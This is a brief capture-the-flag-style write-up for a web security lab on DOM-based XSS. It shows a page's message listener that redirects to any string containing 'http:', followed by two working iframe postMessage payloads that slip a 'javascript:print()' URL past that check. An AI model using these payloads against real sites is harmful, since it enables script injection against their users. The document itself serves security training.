# DOM XSS using web messages and a JavaScript URL

## This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

javascrit code on homepage is

```html
<script>
  window.addEventListener(
    "message",
    function (e) {
      var url = e.data;
      if (url.indexOf("http:") > -1 || url.indexOf("https:") > -1) {
        location.href = url;
      }
    },
    false
  );
</script>
```

to solve this lab
use below code

```html
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')"
></iframe>
```

or

```html
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print();/*http:*/','*')"
></iframe>
```
